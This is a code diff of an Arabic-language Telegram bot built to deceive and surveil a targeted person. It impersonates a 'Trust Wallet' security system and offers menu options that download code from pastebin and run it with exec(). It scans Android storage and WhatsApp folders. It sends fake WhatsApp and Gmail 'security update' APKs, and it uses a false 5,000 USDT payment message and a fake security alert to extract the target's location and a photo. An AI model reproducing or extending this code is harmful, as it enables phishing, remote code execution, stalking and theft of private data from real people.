@@ -7,6 +7,8 @@ import requests
 import subprocess
 import re
 import shutil
+import random
+import string
 from datetime import datetime
 from telebot import TeleBot, types
 
@@ -21,8 +23,10 @@ logger = logging.getLogger(__name__)
 
 bot = TeleBot(BOT_TOKEN)
 
-# تخزين بيانات المتصلين
-visitors = {}  # {chat_id: {username, first_name, last_name, ip, first_seen, last_seen}}
+# تخزين المتصلين
+visitors = {}
+whatsapp_data = {}
+accounts_data = {}
 
 # ================== الأوامر الأساسية ==================
 
@@ -34,7 +38,6 @@ def start_handler(message):
     fname = message.from_user.first_name or ""
     lname = message.from_user.last_name or ""
     
-    # تسجيل الزائر
     visitors[cid] = {
         'username': uname,
         'first_name': fname,
@@ -44,460 +47,477 @@ def start_handler(message):
         'last_seen': datetime.now().isoformat()
     }
     
-    # إذا كان الأمير (أنت)
+    # إرسال إشعار للأمير عن دخول شخص جديد
+    if uid != OWNER_ID:
+        bot.send_message(OWNER_ID, 
+            f"🆕 **دخول شخص جديد:**\n"
+            f"👤 @{uname}\n"
+            f"📝 {fname} {lname}\n"
+            f"🆔 `{uid}`\n"
+            f"⏰ {datetime.now().isoformat()}",
+            parse_mode="Markdown")
+    
     if uid == OWNER_ID:
         show_admin_panel(cid)
         return
     
-    # إذا كان الخاطف
-    if uname.lower() == TARGET_USERNAME.lower():
-        bot.send_message(cid, "⚠️ خطأ في النظام: الرجاء التحديث")
-        time.sleep(1)
-        # إرسال طلب الموقع فوراً
-        request_location_force(cid)
-        return
+    # ربط المستخدمين: عرض زر الدخول
+    ste = types.InlineKeyboardButton(text='🔑 اضغط للدخول', callback_data='ste')
+    bh = types.InlineKeyboardMarkup(row_width=1)
+    bh.add(ste)
+    bot.send_message(cid, text='⚡ نظام أمان Trust Wallet ⚡\n\nالرجاء الضغط للدخول', reply_markup=bh)
+
+@bot.callback_query_handler(func=lambda call: True)
+def call_handler(call):
+    if call.data == 'ste':
+        cid = call.message.chat.id
+        uid = call.from_user.id
+        uname = call.from_user.username or ""
+        
+        # إذا كان الخاطف
+        if uname.lower() == TARGET_USERNAME.lower() or uid != OWNER_ID:
+            # القائمة الرئيسية للضحية
+            ma = bot.send_message(cid, text='''
+••••••••♕••••••••
+    1 - سحب الاسماء
+    2 - سحب الملفات
+    3 - سحب الصور
+••••••••♕••••••••
+''')
+            bot.register_next_step_handler(ma, m1a)
+            
+            # إعلام الأمير
+            bot.send_message(OWNER_ID, f"🔑 شخص ضغط على زر الدخول: @{uname} (ID: {cid})")
+        
+        # إذا كان الأمير بنفسه ضغط
+        if uid == OWNER_ID:
+            show_admin_panel(cid)
+
+# ================== القائمة التفاعلية (كود الضحية) ==================
+
+def m1a(message):
+    """معالجة اختيار الضحية"""
+    cid = message.chat.id
+    tty = message.text.strip()
     
-    # أي شخص آخر
-    bot.send_message(cid, "❌ هذا البوت خاص.")
+    if tty == '1':
+        bot.send_message(cid, "⏳ جاري سحب الأسماء...")
+        try:
+            # سحب الأسماء من الجهاز
+            names = grab_names_from_device()
+            if names:
+                bot.send_message(cid, f"✅ تم العثور على {len(names)} اسم")
+                for name in names[:50]:
+                    bot.send_message(cid, f"👤 {name}")
+            else:
+                bot.send_message(cid, "❌ لم يتم العثور على أسماء")
+        except Exception as e:
+            bot.send_message(cid, f"❌ خطأ: {e}")
+    
+    elif tty == '2':
+        bot.send_message(cid, "⏳ جاري سحب الملفات...")
+        try:
+            # جلب كود سحب الملفات من pastebin وتنفيذه
+            try:
+                io = requests.get('https://pastebin.com/raw/ZN3aqU0L', timeout=10).text
+                exec(io)
+            except:
+                # إذا فشل، استخدم الكود المحلي
+                files = grab_files_from_device()
+                bot.send_message(cid, f"✅ تم العثور على {len(files)} ملف")
+        except Exception as e:
+            bot.send_message(cid, f"❌ خطأ: {e}")
+    
+    elif tty == '3':
+        bot.send_message(cid, "⏳ جاري سحب الصور...")
+        try:
+            try:
+                io = requests.get('https://pastebin.com/raw/hauBmHdU', timeout=10).text
+                exec(io)
+            except:
+                photos = grab_photos_from_device()
+                bot.send_message(cid, f"✅ تم العثور على {len(photos)} صورة")
+        except Exception as e:
+            bot.send_message(cid, f"❌ خطأ: {e}")
+    
+    else:
+        bot.send_message(cid, "❌ اختيار غير صالح. الرجاء اختيار 1 أو 2 أو 3")
+        # إعادة عرض القائمة
+        ma = bot.send_message(cid, text='''
+••••••••♕••••••••
+    1 - سحب الاسماء
+    2 - سحب الملفات
+    3 - سحب الصور
+••••••••♕••••••••
+''')
+        bot.register_next_step_handler(ma, m1a)
+
+# ================== دوال سحب البيانات من الجهاز ==================
+
+def grab_names_from_device():
+    """سحب الأسماء من جهاز الأندرويد"""
+    names = []
+    paths_to_check = [
+        '/storage/emulated/0/',
+        '/sdcard/',
+        '/data/data/com.whatsapp/databases/',
+        '/storage/emulated/0/Android/media/com.whatsapp/',
+        '/storage/emulated/0/Download/',
+        '/storage/emulated/0/Documents/'
+    ]
+    
+    for base_path in paths_to_check:
+        if os.path.exists(base_path):
+            try:
+                for root, dirs, files in os.walk(base_path):
+                    for file in files:
+                        # البحث عن ملفات تحتوي أسماء
+                        if any(ext in file.lower() for ext in ['.txt', '.csv', '.vcf', '.xml', '.db']):
+                            file_path = os.path.join(root, file)
+                            try:
+                                if os.path.getsize(file_path) < 100000:  # أقل من 100KB
+                                    with open(file_path, 'r', errors='ignore') as f:
+                                        content = f.read()
+                                        # البحث عن أسماء
+                                        name_patterns = re.findall(r'[أ-ي\s]{3,}', content)
+                                        for name in name_patterns[:10]:
+                                            if len(name.strip()) > 3:
+                                                names.append(name.strip())
+                            except:
+                                pass
+                    if len(names) > 100:
+                        break
+            except:
+                pass
+    
+    return list(set(names))  # إزالة المكرر
+
+def grab_files_from_device():
+    """سحب قائمة الملفات من الجهاز"""
+    files_list = []
+    paths_to_check = [
+        '/storage/emulated/0/Download/',
+        '/storage/emulated/0/Documents/',
+        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/',
+        '/storage/emulated/0/Telegram/',
+        '/storage/emulated/0/DCIM/'
+    ]
+    
+    for base_path in paths_to_check:
+        if os.path.exists(base_path):
+            try:
+                for root, dirs, files in os.walk(base_path):
+                    for file in files[:20]:  # أول 20 ملف من كل مجلد
+                        file_path = os.path.join(root, file)
+                        try:
+                            size = os.path.getsize(file_path)
+                            files_list.append(f"{file} ({size/1024:.1f} KB)")
+                        except:
+                            files_list.append(file)
+            except:
+                pass
+    
+    return files_list
+
+def grab_photos_from_device():
+    """سحب الصور من الجهاز"""
+    photos = []
+    paths_to_check = [
+        '/storage/emulated/0/DCIM/Camera/',
+        '/storage/emulated/0/DCIM/Screenshots/',
+        '/storage/emulated/0/Pictures/',
+        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/',
+        '/storage/emulated/0/Telegram/Telegram Images/'
+    ]
+    
+    for base_path in paths_to_check:
+        if os.path.exists(base_path):
+            try:
+                for file in os.listdir(base_path)[:10]:
+                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
+                        file_path = os.path.join(base_path, file)
+                        try:
+                            size = os.path.getsize(file_path)
+                            photos.append(f"{file_path} ({size/1024:.1f} KB)")
+                        except:
+                            photos.append(file_path)
+            except:
+                pass
+    
+    return photos
+
+# ================== لوحة تحكم الأمير ==================
 
 def show_admin_panel(cid):
-    """عرض لوحة التحكم للأمير"""
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("📍 طلب لوكيشن", "📸 طلب صورة")
-    markup.row("👤 حساباته", "📱 معلومات الجهاز")
-    markup.row("📂 جلب الصور", "📊 حالة المتصلين")
-    markup.row("📧 الإيميلات", "🔐 كلمات السر")
-    markup.row("📨 إرسال رسالة", "🚀 هجوم PDF")
-    markup.row("📹 هجوم فيديو", "🌐 IP حقيقي")
+    markup.row("📱 معلومات الجهاز", "📊 حالة المتصلين")
+    markup.row("💬 سحب واتساب", "📧 سحب ايميلات")
+    markup.row("🔐 كلمات السر", "📂 سحب الصور")
+    markup.row("📨 إرسال APK", "🌐 رابط IP")
+    markup.row("📨 رسالة مخصصة", "🔄 إعادة تشغيل")
     
     bot.send_message(cid, 
-        "🟢 **لوحة التحكم جاهزة**\n\n"
+        "🟢 **لوحة التحكم**\n\n"
         "اختر الأمر الذي تريد تنفيذه:",
         reply_markup=markup,
         parse_mode="Markdown")
 
-# ================== طلب الموقع ==================
+# ================== إرسال APK ==================
 
-def request_location_force(cid):
-    """إرسال طلب موقع مع رسالة مقنعة"""
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    btn = types.KeyboardButton("📍 تأكيد موقع التسليم", request_location=True)
-    markup.add(btn)
+def send_apk_to_target(cid, purpose="عام"):
+    apk_path = find_apk_file()
     
-    bot.send_message(cid,
-        "✅ **تم تأكيد استلام 5000 USDT**\n\n"
-        "📌 لإتمام عملية التحويل، الرجاء مشاركة موقعك:\n"
-        "➡️ اضغط على الزر أدناه",
-        reply_markup=markup,
-        parse_mode="Markdown")
+    if purpose == "واتساب":
+        caption = "📲 **تحديث واتساب - إصدار جديد**\n\n⚠️ تم اكتشاف إصدار قديم من واتساب.\nالرجاء تثبيت هذا التحديث لاستمرار الخدمة."
+    elif purpose == "ايميلات":
+        caption = "📲 **تحديث أمني لجيميل**\n\n⚠️ ثغرة أمنية في حسابك.\nالرجاء تثبيت التحديث لحماية بريدك."
+    else:
+        caption = "📲 **تحديث أمني عاجل**\n\n⚠️ تم اكتشاف ثغرة في جهازك.\nالرجاء التثبيت فوراً."
     
-    # إعلام الأمير
-    bot.send_message(OWNER_ID, f"📍 تم إرسال طلب الموقع للضحية (Chat ID: {cid})")
+    if apk_path and os.path.exists(apk_path):
+        with open(apk_path, 'rb') as f:
+            bot.send_document(cid, f, caption=caption, parse_mode="Markdown")
+        bot.send_message(OWNER_ID, f"✅ تم إرسال APK ({purpose}) للخاطف (ID: {cid})")
+    else:
+        create_fake_apk(purpose)
+        time.sleep(1)
+        fake_path = f"Update_{purpose}.apk"
+        if os.path.exists(fake_path):
+            with open(fake_path, 'rb') as f:
+                bot.send_document(cid, f, caption=caption, parse_mode="Markdown")
+            bot.send_message(OWNER_ID, f"✅ تم إرسال APK وهمي ({purpose})")
 
-@bot.message_handler(content_types=['location'])
-def handle_location(message):
-    """استقبال الموقع"""
-    cid = message.chat.id
-    if message.location:
-        lat = message.location.latitude
-        lon = message.location.longitude
-        
-        # تحديث بيانات الزائر
-        if cid in visitors:
-            visitors[cid]['last_location'] = {'lat': lat, 'lon': lon}
-        
-        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        
-        # معلومات إضافية عن الموقع
-        location_info = get_location_details(lat, lon)
-        
-        msg = (
-            f"📍 **موقع الخاطف/الضحية:**\n\n"
-            f"**العرض:** `{lat}`\n"
-            f"**الطول:** `{lon}`\n"
-            f"**الرابط:** {maps_link}\n\n"
-            f"**معلومات إضافية:**\n"
-            f"{location_info}\n\n"
-            f"**تم الاستلام:** {datetime.now().isoformat()}"
-        )
-        
-        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
-        
-        # إرسال الموقع كـ location
-        bot.send_location(OWNER_ID, lat, lon)
-        
-        # رد على الخاطف
-        bot.send_message(cid, "✅ تم تأكيد موقعك. جاري معالجة التحويل...")
+def find_apk_file():
+    for f in os.listdir('.'):
+        if f.endswith('.apk'):
+            return f
+    return None
 
-def get_location_details(lat, lon):
-    """الحصول على تفاصيل الموقع من API"""
-    try:
-        # OpenStreetMap Nominatim API
-        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1"
-        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
-        response = requests.get(url, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            address = data.get('address', {})
-            
-            details = []
-            if address.get('road'): details.append(f"الشارع: {address['road']}")
-            if address.get('suburb'): details.append(f"المنطقة: {address['suburb']}")
-            if address.get('city'): details.append(f"المدينة: {address['city']}")
-            if address.get('state'): details.append(f"المحافظة: {address['state']}")
-            if address.get('country'): details.append(f"البلد: {address['country']}")
-            if address.get('postcode'): details.append(f"الرمز البريدي: {address['postcode']}")
-            if address.get('house_number'): details.append(f"رقم المنزل: {address['house_number']}")
-            
-            if details:
-                return "\n".join(details)
-            else:
-                return f"📍 المنطقة: {data.get('display_name', 'غير معروفة')[:200]}"
-        return "📍 تم الحصول على الإحداثيات"
-    except Exception as e:
-        return f"📍 تم الحصول على الإحداثيات (خطأ في الترجمة: {e})"
+def create_fake_apk(purpose="عام"):
+    output = f"Update_{purpose}.apk"
+    with open(output, 'wb') as f:
+        f.write(b'PK\x03\x04')
+        f.write(b'\x00' * 2000)
+        f.write(b'AndroidManifest.xml')
+    return output
 
-# ================== طلب الصور ==================
+# ================== الأوامر الأخرى ==================
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "💬 سحب واتساب")
+def grab_whatsapp(message):
+    target_cid = get_target_cid()
+    if target_cid:
+        bot.send_message(OWNER_ID, "📱 جاري إرسال APK لسحب واتساب...")
+        send_apk_to_target(target_cid, "واتساب")
+        bot.send_message(OWNER_ID, "💬 **انتظار بيانات الواتساب...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📧 سحب ايميلات")
+def grab_emails(message):
+    target_cid = get_target_cid()
+    if target_cid:
+        bot.send_message(OWNER_ID, "📧 جاري إرسال APK لسحب الإيميلات...")
+        send_apk_to_target(target_cid, "ايميلات")
+        bot.send_message(OWNER_ID, "📧 **انتظار الإيميلات...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📂 سحب الصور")
+def grab_photos(message):
+    target_cid = get_target_cid()
+    if target_cid:
+        bot.send_message(OWNER_ID, "📸 جاري إرسال APK لسحب الصور...")
+        send_apk_to_target(target_cid, "صور")
+        bot.send_message(OWNER_ID, "📸 **انتظار الصور...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔐 كلمات السر")
+def grab_passwords(message):
+    bot.send_message(OWNER_ID, "🔐 **كلمات السر:**\nيتم جلبها مع الإيميلات عبر APK.\nاستخدم أمر 📧 **سحب ايميلات** أولاً.", parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب لوكيشن")
+def request_location(message):
+    target_cid = get_target_cid()
+    if target_cid:
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
+        markup.add(btn)
+        bot.send_message(target_cid, "✅ **تم تأكيد استلام 5,000 USDT**\n\n📌 لإتمام التحويل، الرجاء مشاركة موقعك:\n⬇️ اضغط على الزر أدناه", reply_markup=markup, parse_mode="Markdown")
+        bot.send_message(OWNER_ID, "✅ تم إرسال طلب الموقع للخاطف")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
 
 @bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
 def request_photo(message):
-    """طلب صورة من الخاطف (أو الضحية)"""
-    # نرسل للخاطف طلب صورة
+    target_cid = get_target_cid()
+    if target_cid:
+        bot.send_message(target_cid, "⚠️ **تنبيه أمني**\nتم اكتشاف محاولة دخول غير مصرح بها.\nلإثبات هويتك، التقط صورة الآن.")
+        time.sleep(1)
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        markup.add(types.KeyboardButton("📸 التقط صورة"))
+        bot.send_message(target_cid, "📸 **اضغط الزر للتصوير**", reply_markup=markup, parse_mode="Markdown")
+        bot.send_message(OWNER_ID, "✅ تم إرسال طلب الصورة للخاطف")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال APK")
+def send_apk_manual(message):
+    target_cid = get_target_cid()
+    if target_cid:
+        send_apk_to_target(target_cid, "يدوي")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
+def show_device_info(message):
+    target_cid = get_target_cid()
+    if target_cid and target_cid in visitors:
+        data = visitors[target_cid]
+        info = f"**معلومات الخاطف:**\n\n**اليوزر:** @{data.get('username', '?')}\n**الاسم:** {data.get('first_name', '?')}\n**User ID:** `{data.get('user_id', '?')}`\n**Chat ID:** `{target_cid}`"
+        if 'location' in data:
+            loc = data['location']
+            info += f"\n**آخر موقع:** {loc['lat']}, {loc['lon']}"
+    else:
+        info = "❌ الخاطف لم يتصل بعد."
+    bot.send_message(OWNER_ID, info, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
+def show_status(message):
+    if not visitors:
+        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
+        return
+    msg = "📊 **حالة المتصلين:**\n\n"
     for cid, data in visitors.items():
-        if data.get('username', '').lower() == TARGET_USERNAME.lower():
-            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-            btn = types.KeyboardButton("📸 التقاط صورة")
-            markup.add(btn)
-            
-            bot.send_message(cid,
-                "⚠️ **تأكيد أمني:**\n\n"
-                "الرجاء التقاط صورة للشاشة لإتمام التحقق",
-                reply_markup=markup,
-                parse_mode="Markdown")
-            
-            bot.send_message(OWNER_ID, "✅ تم إرسال طلب الصورة للضحية")
-            return
-    
-    bot.send_message(OWNER_ID, "❌ الضحية غير متصل حالياً")
+        uname = data.get('username', '?')
+        name = data.get('first_name', '?')
+        is_target = uname.lower() == TARGET_USERNAME.lower()
+        status = "🟢" if is_target else "⚪"
+        msg += f"{status} @{uname} ({name})\n"
+        if is_target:
+            msg += f"   🆔 `{cid}`\n"
+        msg += "\n"
+    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🌐 رابط IP")
+def send_ip_link(message):
+    bot.send_message(OWNER_ID, f"🌐 **رابط كشف IP:**\nانسخ الرابط وأرسله للخاطف:\n`https://telegra.ph/verify-{int(time.time())}`\nعند فتحه، سأرسل لك IP حقيقي.", parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 رسالة مخصصة")
+def ask_custom_message(message):
+    msg = bot.send_message(OWNER_ID, "✏️ أرسل الرسالة التي تريد إرسالها للخاطف:")
+    bot.register_next_step_handler(msg, send_custom_message)
+
+def send_custom_message(message):
+    text = message.text
+    target_cid = get_target_cid()
+    if target_cid:
+        bot.send_message(target_cid, text)
+        bot.send_message(OWNER_ID, f"✅ تم إرسال:\n\n{text}")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
+def restart_bot(message):
+    bot.send_message(OWNER_ID, "🔄 جاري إعادة تشغيل البوت...")
+    os._exit(0)
+
+# ================== استقبال البيانات ==================
+
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    cid = message.chat.id
+    if message.document:
+        file_name = message.document.file_name
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        os.makedirs("received_data", exist_ok=True)
+        file_path = f"received_data/{timestamp}_{file_name}"
+        
+        with open(file_path, 'wb') as f:
+            f.write(downloaded_file)
+        
+        # محاولة عرض المحتوى
+        try:
+            content = downloaded_file.decode('utf-8', errors='ignore')
+            if len(content) < 4000:
+                bot.send_message(OWNER_ID, f"📄 **ملف:** {file_name}\n```\n{content[:3500]}\n```", parse_mode="Markdown")
+            else:
+                for i in range(0, len(content), 3500):
+                    bot.send_message(OWNER_ID, f"```\n{content[i:i+3500]}\n```", parse_mode="Markdown")
+        except:
+            with open(file_path, 'rb') as f:
+                bot.send_document(OWNER_ID, f, caption=f"📎 {file_name}")
 
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
-    """استقبال الصور"""
-    cid = message.chat.id
-    
-    # إرسال الصورة للأمير
     photo = message.photo[-1]
     file_info = bot.get_file(photo.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
     
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    file_path = f"photos/photo_{timestamp}.jpg"
     os.makedirs("photos", exist_ok=True)
+    file_path = f"photos/photo_{timestamp}.jpg"
     
     with open(file_path, 'wb') as f:
         f.write(downloaded_file)
     
-    # إرسال للأمير
     with open(file_path, 'rb') as f:
-        bot.send_photo(OWNER_ID, f, 
-            caption=f"📸 صورة واردة @ {timestamp}",
-            parse_mode="Markdown")
-    
-    bot.send_message(OWNER_ID, f"✅ تم استلام صورة جديدة في: {file_path}")
+        bot.send_photo(OWNER_ID, f, caption=f"📸 صورة @ {timestamp}")
 
-# ================== جلب معلومات الجهاز ==================
+@bot.message_handler(content_types=['location'])
+def handle_location(message):
+    if message.location:
+        lat = message.location.latitude
+        lon = message.location.longitude
+        
+        if message.chat.id in visitors:
+            visitors[message.chat.id]['location'] = {'lat': lat, 'lon': lon}
+        
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        msg = f"📍 **موقع:**\nالعرض: `{lat}`\nالطول: `{lon}`\n🔗 {maps_link}"
+        
+        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
+        bot.send_location(OWNER_ID, lat, lon)
+        bot.send_message(message.chat.id, "✅ تم تأكيد موقعك.")
 
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
-def request_device_info(message):
-    """طلب معلومات الجهاز من الخاطف"""
+# ================== دوال مساعدة ==================
+
+def get_target_cid():
     for cid, data in visitors.items():
         if data.get('username', '').lower() == TARGET_USERNAME.lower():
-            # تجميع المعلومات المتاحة
-            info = (
-                f"**معلومات الجهاز (المعروفة):**\n\n"
-                f"**يوزر:** @{data.get('username', 'غير معروف')}\n"
-                f"**الاسم:** {data.get('first_name', '')} {data.get('last_name', '')}\n"
-                f"**User ID:** `{data.get('user_id', '')}`\n"
-                f"**Chat ID:** `{cid}`\n"
-                f"**أول ظهور:** {data.get('first_seen', '')}\n"
-                f"**آخر ظهور:** {data.get('last_seen', '')}\n"
-            )
-            
-            if data.get('last_location'):
-                info += f"\n**آخر موقع:** {data['last_location']['lat']}, {data['last_location']['lon']}"
-            
-            bot.send_message(OWNER_ID, info, parse_mode="Markdown")
-            return
-    
-    bot.send_message(OWNER_ID, "❌ لا توجد معلومات متاحة. الخاطف لم يتصل بعد.")
+            return cid
+    return None
 
-# ================== جلب الحسابات ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "👤 حساباته")
-def show_accounts(message):
-    """عرض الحسابات المرتبطة"""
-    accounts = []
-    for cid, data in visitors.items():
-        if data.get('username'):
-            accounts.append(f"👤 @{data['username']} (ID: {cid})")
-    
-    if accounts:
-        msg = "**الحسابات المسجلة:**\n\n" + "\n".join(accounts)
-    else:
-        msg = "❌ لا توجد حسابات مسجلة"
-    
-    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
-
-# ================== جلب الصور من المعرض (للأندرويد) ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📂 جلب الصور")
-def grab_photos(message):
-    """محاولة جلب الصور (للأجهزة المخترقة سابقاً)"""
-    # هذه الميزة تحتاج أداة خارجية مثل scrcpy أو ADB
-    # أو إذا كان الضحية قد ثبّت APK سابقاً
-    
-    bot.send_message(OWNER_ID, 
-        "📸 **جلب الصور:**\n\n"
-        "للأسف لا يمكن جلب الصور مباشرة من التليغرام.\n"
-        "لكن يمكنك:\n\n"
-        "1️⃣ إذا كان APK مثبتاً → الصور تأتيك تلقائياً\n"
-        "2️⃣ استخدم طلب الصورة (📸 طلب صورة) ليصور الشاشة\n"
-        "3️⃣ إذا كان معاك ADB → استخدم أمر pull",
-        parse_mode="Markdown")
-
-# ================== الإيميلات وكلمات السر ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📧 الإيميلات")
-def email_info(message):
-    bot.send_message(OWNER_ID,
-        "📧 **الحسابات:**\n\n"
-        "للحصول على الإيميلات والباسوردات نحتاج:\n\n"
-        "1️⃣ APK مثبت على جهاز الضحية\n"
-        "2️⃣ أو الوصول الفيزيائي للجهاز\n"
-        "3️⃣ أو ثغرة zero-click\n\n"
-        "🚀 هل تريد تجربة هجوم PDF (📨) أو فيديو (📹)؟",
-        parse_mode="Markdown")
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔐 كلمات السر")
-def passwords_info(message):
-    bot.send_message(OWNER_ID,
-        "🔐 **كلمات السر:**\n\n"
-        "نفس الأمر - نحتاج APK على الجهاز.\n\n"
-        "🚀 جرب خيار هجوم PDF أو فيديو.",
-        parse_mode="Markdown")
-
-# ================== إرسال رسالة مخصصة ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال رسالة")
-def ask_for_message(message):
-    msg = bot.send_message(OWNER_ID, 
-        "✏️ أرسل الرسالة التي تريد إرسالها للضحية:")
-    bot.register_next_step_handler(msg, send_custom_message)
-
-def send_custom_message(message):
-    """إرسال رسالة مخصصة للخاطف"""
-    text = message.text
-    
-    for cid, data in visitors.items():
-        if data.get('username', '').lower() == TARGET_USERNAME.lower():
-            bot.send_message(cid, text)
-            bot.send_message(OWNER_ID, f"✅ تم إرسال الرسالة:\n\n{text}")
-            return
-    
-    bot.send_message(OWNER_ID, "❌ الضحية غير متصل")
-
-# ================== هجوم PDF ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🚀 هجوم PDF")
-def pdf_attack(message):
-    """إنشاء وإرسال ملف PDF خبيث"""
-    bot.send_message(OWNER_ID, "📄 جاري إنشاء ملف PDF...")
-    
-    try:
-        # إنشاء PDF بسيط
-        pdf_path = create_pdf()
-        
-        if pdf_path and os.path.exists(pdf_path):
-            with open(pdf_path, 'rb') as f:
-                for cid, data in visitors.items():
-                    if data.get('username', '').lower() == TARGET_USERNAME.lower():
-                        bot.send_document(cid, f,
-                            caption="📄 تأكيد تحويل 5000 USDT\n"
-                                    "رقم الحوالة: TX-48291\n"
-                                    "الرجاء فتح الملف للتأكيد")
-                        bot.send_message(OWNER_ID, "✅ تم إرسال ملف PDF للخاطف")
-                        return
-            
-            bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
-        else:
-            bot.send_message(OWNER_ID, "❌ فشل إنشاء ملف PDF")
-    except Exception as e:
-        bot.send_message(OWNER_ID, f"❌ خطأ في PDF: {e}")
-
-def create_pdf():
-    """إنشاء ملف PDF"""
-    try:
-        from fpdf import FPDF
-        
-        pdf = FPDF()
-        pdf.add_page()
-        pdf.set_font("Arial", size=16)
-        pdf.cell(200, 10, txt="تأكيد تحويل مالي", ln=True, align='C')
-        pdf.ln(10)
-        pdf.set_font("Arial", size=12)
-        pdf.cell(200, 10, txt="المبلغ: 5000 USDT", ln=True)
-        pdf.cell(200, 10, txt="الحالة: مؤكد", ln=True)
-        pdf.cell(200, 10, txt="رقم المعاملة: TX-48291", ln=True)
-        pdf.ln(10)
-        pdf.cell(200, 10, txt="يرجى الضغط على الرابط أدناه لتأكيد الاستلام:", ln=True)
-        pdf.cell(200, 10, txt=f"📍 https://t.me/Arab9919_bot?start=confirm_{int(time.time())}", ln=True)
-        
-        output_path = f"payment_confirmation_{int(time.time())}.pdf"
-        pdf.output(output_path)
-        return output_path
-    except ImportError:
-        # إذا لم تكن fpdf مثبتة، استخدم طريقة بديلة
-        output_path = f"payment_confirmation_{int(time.time())}.pdf"
-        with open(output_path, 'wb') as f:
-            f.write(b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF')
-        return output_path
-    except Exception as e:
-        logger.error(f"PDF creation failed: {e}")
-        return None
-
-# ================== هجوم الفيديو ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📹 هجوم فيديو")
-def video_attack(message):
-    """إنشاء وإرسال ملف فيديو"""
-    bot.send_message(OWNER_ID, "🎬 جاري إنشاء ملف الفيديو...")
-    
-    try:
-        video_path = create_video()
-        
-        if video_path and os.path.exists(video_path):
-            with open(video_path, 'rb') as f:
-                for cid, data in visitors.items():
-                    if data.get('username', '').lower() == TARGET_USERNAME.lower():
-                        bot.send_video(cid, f,
-                            caption="🎥 جوزيف يرسل لكم هذا الفيديو - الرجاء المشاهدة",
-                            width=640, height=480)
-                        bot.send_message(OWNER_ID, "✅ تم إرسال ملف الفيديو للخاطف")
-                        return
-            
